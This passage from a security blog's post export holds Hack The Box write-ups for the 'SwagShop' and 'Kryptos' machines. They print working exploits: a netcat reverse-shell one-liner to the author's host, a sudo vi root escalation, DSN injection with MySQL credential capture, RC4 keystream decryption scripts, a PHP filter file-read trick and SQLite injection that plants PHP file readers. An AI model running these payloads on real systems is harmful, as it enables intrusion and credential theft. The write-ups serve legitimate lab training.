is running the Magento CMS:Gobuster finds the directories associated with Magento:# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.140/app (Status: 301)/downloader (Status: 301)/errors (Status: 301)/favicon.ico (Status: 200)/includes (Status: 301)/js (Status: 301)/lib (Status: 301)/media (Status: 301)/pkginfo (Status: 301)/server-status (Status: 403)/shell (Status: 301)/skin (Status: 301)/var (Status: 301)=====================================================2019/05/11 20:57:10 Finished=====================================================Indexing is on for those directories:I have access to /app/etc/local.xml which contains the encrypted database password and the encryption key.I could not find any public tool to decrypt the password and because this is a 20 pts box there’s probably some generic CVE exploit online that I can use.Getting a shellA quick look with searchsploit magento shows the two interesting exploits:  Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution  Magento eCommerce - Remote Code ExecutionThe Magento eCommerce - Remote Code Execution exploit creates a new admin account with forme/forme as credentials. I just need to modify the target and the exploit and launch it to get an admin account:# python 37997.pyWORKEDCheck http://10.10.10.140/index.php/admin with creds formI can now log in to the admin panel:I’ll use the other exploit Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution to gain remote code execution. I need to change the username, password, and install_date parameters. The install_data is in the local.xml I found earlier.username = 'forme'password = 'forme'php_function = 'system'  # Note: we can only pass 1 argument to the functioninstall_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xmlLaunching exploit to spawn a reverse shell:python 37811.py http://10.10.10.140/index.php/admin \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 9999 &gt;/tmp/f\"# nc -lvnp 9999Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::9999Ncat: Listening on 0.0.0.0:9999Ncat: Connection from 10.10.10.140.Ncat: Connection from 10.10.10.140:44376./bin/sh: 0: can't access tty; job control turned off$ whoamiwww-data$ cd /home$ lsharis$ cat haris/user.txta44887...PrivescThe privesc is obvious: The www-data user can execute vi as root. I know I can spawn a shell from within vi with :!/bin/sh and it’ll run as root because of sudo.$ sudo -lMatching Defaults entries for www-data on swagshop:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on swagshop:    (root) NOPASSWD: /usr/bin/vi /var/www/html/*$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@swagshop:/home$ sudo /usr/bin/vi /var/www/html/pwn -c ':!/bin/sh'# iduid=0(root) gid=0(root) groups=0(root)# cat /root/root.txtc2b087...   ___ ___ /| |/|\\| |\\/_| ´ |.` |_\\           We are open! (Almost)  |   |.  |  |   |.  |         Join the beta HTB Swag Store!  |___|.__|       https://hackthebox.store/password                   PS: Use root flag as password!#"
  },
  
  {
    "title": "Kryptos - Hack The Box",
    "url": "/posts/htb-writeup-kryptos/",
    "categories": "hackthebox, infosec",
    "tags": "linux, crypto, sqli, php, vim, lfi, mysql, sqlite, injection, jail escape",
    "date": "2019-09-21 00:00:00 +0800",
    





    
    "snippet": "I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I...",
    "content": "I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there’s an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I’ll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.NmapNot much to see here, standard Linux box with SSH and Apache.# nmap -sC -sV -p- kryptos.htbStarting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 19:01 EDTNmap scan report for kryptos.htb (10.10.10.129)Host is up (0.012s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Cryptor LoginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb - 1st part (login page)The web page contains a simple login form with a username and password.I tried guessing a few credentials and always got a Nope. message:I see that the POST request passes the username and passwords as well as a CSRF token and a db value.I ran gobuster and found a couple of interesting directories and files but I get a redirect to the login page everytime because I’m not logged in so I’ll need to bypass the login page first. That /dev folder gives me a 403 error so it’s probably only accessible locally or something.# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -t 50 -u http://kryptos.htb/.htpasswd (Status: 403)/.htpasswd.php (Status: 403)/.htaccess (Status: 403)/.htaccess.php (Status: 403)/aes.php (Status: 200)/cgi-bin/ (Status: 403)/cgi-bin/.php (Status: 403)/css (Status: 301)/decrypt.php (Status: 302)/dev (Status: 403)/encrypt.php (Status: 302)/index.php (Status: 200)/logout.php (Status: 302)/server-status (Status: 403)/url.php (Status: 200)Because this box is ranked insane difficulty, this is most likely not a login page that I can bypass with a simple SQL injection. After playing with some of the parameters with Burp I found that whenever I change the db parameter I get the following error message:Connection: closeContent-Type: text/html; charset=UTF-8PDOException code: 1044That CSRF token is annoying and makes the process of trying different parameters a pain in the ass while using Burp. I made a quick script to automate getting the CSRF token and testing different payloads:#!/ust/bin/pythonimport readlineimport requestsfrom bs4 import BeautifulSoupheaders = { \"Cookie\": \"PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi\" }while True:    cmd = raw_input(\"&gt; \")    r = requests.get(\"http://kryptos.htb\", headers=headers)    soup = BeautifulSoup(r.text, 'html.parser')    csrf = soup.find(\"input\", {\"name\": \"token\"})[\"value\"]    data = { \"username\": \"user\", \"password\": \"pass\", \"db\": cmd, \"token\": csrf, \"login\": \"\"}    print data    r = requests.post(\"http://kryptos.htb\", data=data, headers=headers)    print r.textSample output:# python db.py&gt; invalid{'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'invalid', 'login': ''}PDOException code: 1044&gt; test{'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'test', 'login': ''}PDOException code: 1044According to the PDO documentation:  The PHP Data Objects (PDO) extension defines a lightweight, consistent interface for accessing databases in PHP. Each database driver that implements the PDO interface can expose database-specific features as regular extension functions.The PDO constructor documentation shows a code example using PDO:The DSN string contains the database name which I can pass in the login request. This looks like a potential injection point. If we can control the DSN string then we can potentially redirect the database connection to another host instead of the target server.To verify this I started a netcat listener on my Kali VM on port 3306 and injected the following string: ;dbname=cryptor;host=10.10.14.23;The MySQL server connects back to me so that means I can capture the challenge and response pairs and then crack them offline. Metasploit already has a module for that: server/capture/mysqlmsf5 auxiliary(server/capture/mysql) &gt; show optionsModule options (auxiliary/server/capture/mysql):   Name        Current Setting                           Required  Description   ----        ---------------                           --------  -----------   CAINPWFILE                                            no        The local filename to store the hashes in Cain&amp;Abel format   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge   JOHNPWFILE  /root/htb/kryptos/mysqlpwd                no        The prefix to the local filename to store the hashes in JOHN format   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT     3306                                      yes       The local port to listen on.   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response   SSL         false                                     no        Negotiate SSL for incoming connections   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)msf5 auxiliary(server/capture/mysql) &gt;[+] 10.10.10.129:58670 - User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; Database: cryptorThe hash was saved to the following file:# cat mysqlpwd_mysqlnadbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9dI’m able to crack the hash with hashcat: krypt0n1te# john -w=/usr/share/wordlists/rockyou.txt mysqlpwd_mysqlnaUsing default input encoding: UTF-8Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuskrypt0n1te       (dbuser)I tried those credentials on the login page but as expected they don’t work because they’re the DB creds, not the actual user credentials in the database. Since I now control which database backend is used for authentication and I have the credentials, I can create a database on my own machine with a username/password that I control. This will allow me to pass the authentication and login in to the site.First, I need to change the MySQL server configuration so the servers listens on all interface and not just localhost:# cat /etc/mysql/mariadb.conf.d/50-server.cnf# this is read by the standalone daemon and embedded servers[server]# this is only for the mysqld standalone daemon[mysqld]bind-address = 0.0.0.0Next I created a database and guessed that the table name is users (we can see validate this anyways by checking the MySQL logs generated when the server connects to our database)MariaDB [(none)]&gt; create database cryptor;Query OK, 1 row affected (0.00 sec)MariaDB [(none)]&gt; use cryptor;Database changedMariaDB [cryptor]&gt; create table users (username varchar(255), password varchar(255));Query OK, 0 rows affected (0.01 sec)MariaDB [cryptor]&gt; insert into users (username, password) values ('snowscan', 'yolo1234');Query OK, 1 row affected (0.00 sec)MariaDB [cryptor]&gt; grant all privileges on cryptor.* to 'dbuser'@'%' identified by 'krypt0n1te';Query OK, 0 rows affected (0.01 sec)MariaDB [cryptor]&gt; flush privileges;Query OK, 0 rows affected (0.01 sec)I set up the Match and Replace function in Burp so I don’t need to fiddle with the Intercept every time:I still got a Nope. message when logging in but I noticed in the MySQL logs that the SQL query is using the MD5 value of the password instead of the plaintext password.root@ragingunicorn:/var/log/mysql# tail -f *33 Query SELECT username, password FROM users WHERE username='snowscan' AND password='5ba4e0731a6248ea222262e4a65a912b'So I just modified the existing password entry with the MD5 value of yolo1234:MariaDB [cryptor]&gt; update users set password='5ba4e0731a6248ea222262e4a65a912b' where username='snowscan';Query OK, 1 row affected (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 0And now I can log in successfully:Web - 2nd part (crypto)The web app encrypts files that are linked on the form with either AES-CBC or RC4. I don’t get to pick the key so I assume this is hardcoded in the code which I don’t have access to right now. I tried fuzzing the handler to use file:/// or something like that and also tried to pick another cipher like None or Null but that didn’t work.I don’t see any obvious way to exploit AES-CBC here but RC4 is interesting because the key stream generated here is the same across all files we encrypt. To verify this I created three different files on my machine:# echo AAAAAAAA &gt; 1# echo AAAAAAAAAAAAAAAA &gt; 2# echo AAAAAAAAAAAAAAAAAAAAAAAA &gt; 3When I encrypt the files, I can clearly see that the same key stream is used across all 3 files since the beginning of the ciphertext is the same:Here’s the base64 encoded ciphertext of the 3 files:GX+u3Xsraj9AGX+u3Xsraj8L2vu3pnC2hfU=GX+u3Xsraj8L2vu3pnC2hb52BXbRJNo4Vw==The ciphertext is common across all three plaintexts so the encryption here is using a static key for generate the RC4 key stream. I can’t recover the key used to initialize RC4 but I can recover the XOR key stream since I control the plaintext and I also have the ciphertext. I just need to generate a large file, encrypt it with the web application and XOR the ciphertext with the original plaintext to recover the key stream. Then I can use the key stream to decrypt the ciphertext of other files.# python -c 'print \"A\" * 1000000' &gt; plaintextI saved the output to ciphertext on my machine, then used a script to XOR both plaintext and ciphertext and generate a key stream file.#!/ust/bin/pythonimport base64def sxor(s1,s2):    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))with open('plaintext', 'rb') as f:    p = f.read()with open('ciphertext', 'rb') as f:    c = base64.b64decode(f.read())k = sxor(p, c)with open('keystream', 'wb') as f:    f.write(k)After generating the key stream, I wrote another script that issues request on the file encryptor and decrypts the output with the keystream file I generated.#!/usr/bin/pythonfrom bs4 import BeautifulSoupimport base64import requestsimport readlineimport sysheaders = { \"Cookie\": \"PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi\"}def sxor(s1,s2):    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))if len(sys.argv) != 2:    print \"Usage: decrypthttp.py &lt;url&gt;\"    sys.exit(-1)with open(\"keystream\", \"rb\") as f:    k = f.read()r = requests.get(\"http://kryptos.htb/encrypt.php?cipher=RC4&amp;url=%s\" % sys.argv[1], headers=headers)soup = BeautifulSoup(r.text, \"html.parser\")result_b64 = soup.find(\"textarea\").stringif result_b64:    c = base64.b64decode(result_b64)    p = sxor(c, k)    print pelse:    print \"** Nothing returned **\"The next step of the operation here is to exploit the file encryptor to read local files. By using the file encryptor I’m able to query that /dev/ directory which I had found earlier but that gave me a 403 forbidden message.# python decrypthttp.py http://127.0.0.1/dev/&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;\t&lt;div class=\"menu\"&gt;\t    &lt;a href=\"index.php\"&gt;Main Page&lt;/a&gt;\t    &lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;\t    &lt;a href=\"index.php?view=todo\"&gt;ToDo&lt;/a&gt;\t&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Fetching the two pages shown above:# python decrypthttp.py http://127.0.0.1/dev/index.php?view=about    &lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;\t&lt;div class=\"menu\"&gt;\t    &lt;a href=\"index.php\"&gt;Main Page&lt;/a&gt;\t    &lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;\t    &lt;a href=\"index.php?view=todo\"&gt;ToDo&lt;/a&gt;\t&lt;/div&gt;This is about page&lt;/body&gt;&lt;/html&gt;# python decrypthttp.py http://127.0.0.1/dev/index.php?view=todo&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;\t&lt;div class=\"menu\"&gt;\t    &lt;a href=\"index.php\"&gt;Main Page&lt;/a&gt;\t    &lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;\t    &lt;a href=\"index.php?view=todo\"&gt;ToDo&lt;/a&gt;\t&lt;/div&gt;&lt;h3&gt;ToDo List:&lt;/h3&gt;1) Remove sqlite_test_page.php&lt;br&gt;2) Remove world writable folder which was used for sqlite testing&lt;br&gt;3) Do the needful&lt;h3&gt; Done: &lt;/h3&gt;1) Restrict access to /dev&lt;br&gt;2) Disable dangerous PHP functions&lt;/body&gt;&lt;/html&gt;The next target seems to be sqlite_test_page.php but the page doesn’t seem to return much:# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;It’s probably expecting some parameter either in a GET or POST request but I don’t know what the parameter name is. The index.php page uses the view parameter to display the other pages by including the parameter name concatenated with the .php extension. I can confirm this below by browsing to about.php directly.# python decrypthttp.py http://127.0.0.1/dev/about.phpThis is about pageThis view parameter is probably a good target for an LFI but at first glance I wasn’t able to get anywhere when I tried the obvious suspects like ../../../etc/passwd because .php is appended to the parameter:# python decrypthttp.py http://127.0.0.1/dev/index.php?view=../../../../etc/passwd&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;\t&lt;div class=\"menu\"&gt;\t    &lt;a href=\"index.php\"&gt;Main Page&lt;/a&gt;\t    &lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;\t    &lt;a href=\"index.php?view=todo\"&gt;ToDo&lt;/a&gt;\t&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;So I used the PHP filter trick to read the sqlite_test_page.php. I’m using the base64 filter to encode and return the content of the file being included.# python decrypthttp.py \"http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page\"&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;\t&lt;div class=\"menu\"&gt;\t    &lt;a href=\"index.php\"&gt;Main Page&lt;/a&gt;\t    &lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;\t    &lt;a href=\"index.php?view=todo\"&gt;ToDo&lt;/a&gt;\t&lt;/div&gt;PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo=&lt;/body&gt;&lt;/html&gt;After decoding the base64, I got the source code for sqlite_test_page.php&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$no_results = $_GET['no_results'];$bookid = $_GET['bookid'];$query = \"SELECT * FROM books WHERE id=\".$bookid;if (isset($bookid)) {   class MyDB extends SQLite3   {      function __construct()      {\t // This folder is world writable - to be able to create/modify databases from PHP code         $this-&gt;open('d9e28afcf0b274a5e0542abb67db0784/books.db');      }   }   $db = new MyDB();   if(!$db){      echo $db-&gt;lastErrorMsg();   } else {      echo \"Opened database successfully\\n\";   }   echo \"Query : \".$query.\"\\n\";if (isset($no_results)) {   $ret = $db-&gt;exec($query);   if($ret==FALSE)    {\techo \"Error : \".$db-&gt;lastErrorMsg();    }}else{   $ret = $db-&gt;query($query);   while($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) ){      echo \"Name = \". $row['name'] . \"\\n\";   }   if($ret==FALSE)    {\techo \"Error : \".$db-&gt;lastErrorMsg();    }   $db-&gt;close();}}?&gt;&lt;/body&gt;&lt;/html&gt;Based on the code above I see that:  The d9e28afcf0b274a5e0542abb67db0784 directory is world writable  The GET parameters for this code are no_results and bookid  The SQL query is clearly injectable as there is no sanitization doneI downloaded the entire .db file using the PHP filter LFI and it only contains a single table with two rows so there is nothing of value to extract using an SQL injection.# sqlite3 books.dbSQLite version 3.27.2 2019-02-25 16:06:06Enter \".help\" for usage hints.sqlite&gt; .tablesbookssqlite&gt; select * from books;1|Serious Cryptography2|Applied Cryptography# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php?bookid=1&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;Opened database successfullyQuery : SELECT * FROM books WHERE id=1Name = Serious Cryptography&lt;/body&gt;&lt;/html&gt;I tried a simple injection with 1 or 2 but it failed when I tried it:# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?bookid=1 or 2\"&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Bad Request&lt;/h1&gt;&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;This is because I need to URL encode the value of the bookid parameter otherwise the query becomes invalid.I modified the script to support a 2nd argument that contains extra data that needs to be URL encoded twice:#!/usr/bin/pythonfrom bs4 import BeautifulSoupimport base64import requestsimport readlineimport sysimport urllibheaders = { \"Cookie\": \"PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi\"}proxies = { \"http\": \"http://127.0.0.1:8080\" }def sxor(s1,s2):    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))payload = urllib.quote_plus(sys.argv[1])extra = \"\"  # Extra payload to be double-encodedif len(sys.argv) &lt; 2:    print \"Usage: decrypthttp.py &lt;url&gt; &lt;extra&gt;\"    sys.exit(-1)elif len(sys.argv) == 3:    extra = urllib.quote_plus(urllib.quote_plus(sys.argv[2]))with open(\"keystream\", \"rb\") as f:    k = f.read()r = requests.get(\"http://kryptos.htb/encrypt.php?cipher=RC4&amp;url=%s%s\" % (payload, extra), headers=headers, proxies=proxies)soup = BeautifulSoup(r.text, \"html.parser\")result_b64 = soup.find(\"textarea\").stringif result_b64:    c = base64.b64decode(result_b64)    p = sxor(c, k)    print pelse:    print \"** Nothing returned **\"Testing the injection again, I can see that it works now since I get both book entries:# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?bookid=\" \"1 or 2\"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;Opened database successfullyQuery : SELECT * FROM books WHERE id=1 or 2Name = Serious CryptographyName = Applied Cryptography&lt;/body&gt;&lt;/html&gt;Sqlite supports stacked queries so that allows me to write arbitrary files. I can create a new database in the d9e28afcf0b274a5e0542abb67db0784 directory and write PHP data into a table. Then by issuing a GET to that file the PHP code should be reached and executed.First, I tested writing a simple text file with no PHP code.# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1\" \";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');\"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;Opened database successfullyQuery : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');&lt;/body&gt;&lt;/html&gt;# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.txt\"��.EtablepwnpwnCREATE TABLE pwn (yolo text)  !Testing...So this confirms that I can now write files to the target directory. Then I wrote a phpinfo.php to check the PHP configuration:# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1\" \";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php phpinfo(); ?&gt;');\"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;Opened database successfullyQuery : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php phpinfo(); ?&gt;');&lt;/body&gt;&lt;/html&gt;# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/phpinfo.php\"[...]&lt;tr&gt;&lt;td class=\"e\"&gt;System &lt;/td&gt;&lt;td class=\"v\"&gt;Linux kryptos 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 &lt;/td&gt;&lt;/tr&gt;[...]&lt;tr&gt;&lt;td class=\"e\"&gt;disable_functions&lt;/td&gt;&lt;td class=\"v\"&gt;system,dl,passthru,exec,shell_exec,popen,escapeshellcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,&lt;/td&gt;&lt;td class=\"v\"&gt;system,dl,passthru,exec,shell_exec,popen,escapeshellcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,&lt;/td&gt;&lt;/tr&gt;I can’t easily get a PHP shell since most of the “dangerous” functions are disabled. But I can read directories and files.To scan directories:# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1\" \";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dir.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php var_dump(scandir(\\$_GET[\\\"x\\\"])); ?&gt;');\"I found the user directory and interesting files in it:# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/\"��)[array(3) {nCREATE TABLE pwn (yolo text)  [0]=&gt;  string(1) \".\"  [1]=&gt;  string(2) \"..\"  [2]=&gt;  string(8) \"rijndael\"}# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/rijndael\"��)[array(13) {CREATE TABLE pwn (yolo text)  [0]=&gt;  string(1) \".\"  [1]=&gt;  string(2) \"..\"  [2]=&gt;  string(13) \".bash_history\"  [3]=&gt;  string(12) \".bash_logout\"  [4]=&gt;  string(7) \".bashrc\"  [5]=&gt;  string(6) \".cache\"  [6]=&gt;  string(6) \".gnupg\"  [7]=&gt;  string(8) \".profile\"  [8]=&gt;  string(4) \".ssh\"  [9]=&gt;  string(9) \"creds.old\"  [10]=&gt;  string(9) \"creds.txt\"  [11]=&gt;  string(7) \"kryptos\"  [12]=&gt;  string(8) \"user.txt\"}To read the files:# python decrypthttp.py \"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1\" \";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/file.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php readfile(\\$_GET[\\\"x\\\"]); ?&gt;');\"# python decrypthttp.py \"http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/etc/passwd\"�� Iroot:x:0:0:root:/root:/bin/bashlo text)daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd 